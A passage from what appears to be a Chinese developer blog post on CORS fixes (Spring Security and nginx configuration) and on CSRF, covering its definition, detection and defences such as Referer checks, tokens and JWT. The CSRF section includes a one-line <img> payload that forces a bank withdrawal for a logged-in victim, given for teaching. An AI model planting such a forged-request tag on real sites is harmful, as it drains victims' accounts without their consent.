+<p>解决跨域问题的方法这里记录两个：<br>1、CORS（跨域资源共享）： 在后端服务中设置适当的 CORS 头部，允许特定域的请求访问资源。通过配置响应头，后端可以明确指定哪些域是允许的，哪些方法和头部是允许的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">httpSecurity</span><br><span class="line">                // CSRF禁用,因为不使用session</span><br><span class="line">                .csrf().disable()</span><br><span class="line">                // 认证失败处理类</span><br><span class="line">                .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and()</span><br><span class="line">                // 基于token,所以不需要session</span><br><span class="line">                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and()</span><br><span class="line">                // 过滤请求</span><br><span class="line">                .authorizeRequests()</span><br><span class="line">                // 对于登录login 注册register 验证码captchaImage 允许匿名访问</span><br><span class="line">                .antMatchers(&quot;/login&quot;, &quot;/register&quot;, &quot;/captchaImage&quot;).anonymous()</span><br><span class="line">                // 静态资源,可匿名访问</span><br><span class="line">                .antMatchers(HttpMethod.GET, &quot;/&quot;, &quot;/*.html&quot;, &quot;/**/*.html&quot;, &quot;/**/*.css&quot;, &quot;/**/*.js&quot;, &quot;/profile/**&quot;)</span><br><span class="line">                .permitAll()</span><br><span class="line">                .antMatchers(&quot;/webjars/**&quot;, &quot;/*/api-docs&quot;, &quot;/druid/**&quot;)</span><br><span class="line">                .permitAll()</span><br><span class="line">                // 除上面外的所有请求全部需要鉴权认证</span><br><span class="line">                .anyRequest().authenticated()</span><br><span class="line">                .and()</span><br><span class="line">                .headers().frameOptions().disable();</span><br><span class="line">        // 添加Logout filter</span><br><span class="line">        httpSecurity.logout().logoutUrl(&quot;/logout&quot;).logoutSuccessHandler(logoutSuccessHandler);</span><br><span class="line">        // 添加JWT filter</span><br><span class="line">        httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class);</span><br><span class="line">        // 添加CORS filter</span><br><span class="line">        httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class);</span><br><span class="line">        httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class);</span><br></pre></td></tr></table></figure>
+<p>2、代理服务器： 前端通过向同一域的代理服务器发起请求，再由代理服务器转发请求到后端。这样，由于同源策略仅在浏览器中执行，代理服务器和后端之间的通信不受同源策略的限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8082;</span><br><span class="line">        server_name localhost 192.168.50.124;</span><br><span class="line">        location /&#123;</span><br><span class="line">                #请填写具体域名  解决服务端返回401等错误时浏览器报跨域错误。nginx 转发 server 响应的过程中，add_header 只有在 200,201,204,206,301,302,303,304,307 状态码时会添加，而 401、500，都没有添加。解决：在 add_header 最后加上 always，可以让 nginx 在非默认状态码下 add_header 也可以生效。</span><br><span class="line"></span><br><span class="line">                add_header &quot;Access-Control-Allow-Origin&quot;  &quot;http://192.168.50.124&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Credentials&quot; &quot;true&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Methods&quot; &quot;GET, POST, PUT, OPTIONS, HEAD&quot; always;</span><br><span class="line">                add_header &quot;Access-Control-Allow-Headers&quot; &quot;Origin,X-Requested-With,Content-Type,Cache-Control,Accept,Authorization,BBS-XSRF-TOKEN,Set-Cookie&quot; always;</span><br><span class="line">                #预检命令的缓存，如果不缓存每次会发送两次请求</span><br><span class="line">                add_header Access-Control-Max-Age 3600 always;</span><br><span class="line"></span><br><span class="line">                if ($request_method = &#x27;OPTIONS&#x27;) &#123;</span><br><span class="line">                        return 204;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                client_max_body_size 100M; #允许上传文件大小,默认是1M</span><br><span class="line"></span><br><span class="line">                proxy_set_header Host $host;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">                proxy_pass $scheme://192.168.50.124:8081;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>跨站请求伪造（英语：Cross-site request forgery），也被称为one-click attack或者session riding，通常缩写为CSRF或者XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>
+<h2 id="攻击示例："><a href="#攻击示例：" class="headerlink" title="攻击示例："></a>攻击示例：</h2><p>假如一家银行用以执行转账操作的URL地址如下： <code>https://bank.example.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</code></p>
+<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码： <code>&lt;img src=&quot;https://bank.example.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot; /&gt;</code></p>
+<p>如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失1000资金。</p>
+<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+<p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户的浏览器，让其以用户的名义执行操作。</p>
+<h2 id="csrf漏洞检测"><a href="#csrf漏洞检测" class="headerlink" title="csrf漏洞检测"></a>csrf漏洞检测</h2><p> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。<br>       <br>随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。<br>       <br>以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
+<h2 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h3><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。</p>
+<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
+<h3 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h3><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+<p>SpringSecurity中就可以配置是否开启CSRF的token</p>
+<h3 id="在RuoYi项目中的防御措施——关闭cookie认证并启用JWT"><a href="#在RuoYi项目中的防御措施——关闭cookie认证并启用JWT" class="headerlink" title="在RuoYi项目中的防御措施——关闭cookie认证并启用JWT"></a>在RuoYi项目中的防御措施——关闭cookie认证并启用JWT</h3><p>csrf的风险源在于cookie认证，因为浏览器在发送请求时会自动将cookie附带上去。</p>
+<p>而在服务端关闭cookie作为鉴权方式，开启jwt鉴权则可以有效避免这一点，其原理其实也还是上面的——添加校验token。</p>
+<p>jwt在笔记《写一个登录系统需要注意的地方》中有介绍过，其流程在这简单复述一遍，即用户登录系统后，服务器端根据用户信息按照一定加密方式生成一个JWT Token，服务器端并不保存该token，直接发送到客户端中，客户端收到后浏览器将该token存储在cookie或者LocalStorage中，在客户端发送请求的时候，前端代码手动将JWT Token附加到请求的头部或其他位置，发送到服务端。</p>
+<p>此时遇到csrf攻击，cookie自动传输过去了也不会发生作用，因为后端不依赖cookie鉴权，而是依赖手动添加的token鉴权，单纯的csrf攻击是没法获取到cookie中的信息的，他只是发送请求，浏览器自动将cookie带去客户端。所以该方法可以有效避免csrf攻击。</p>
+<p>但还是要注意，如果是xss攻击是可以获取到cookie的，也就是说当网站存在xss漏洞时，上面的防御都是空谈。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">java学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AD%A6%E4%B9%A0/" class="print-no-link">#java学习</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>XSS、同源策略和CSRF</div>
+      <div>https://hukaichao.me/2023/12/21/XSS、同源策略和CSRF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>凌冬</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/26/RxJava/" title="RxJava">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">RxJava</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/19/%E5%86%99%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9/" title="写一个登录系统需要注意的地方">
+                        <span class="hidden-mobile">写一个登录系统需要注意的地方</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
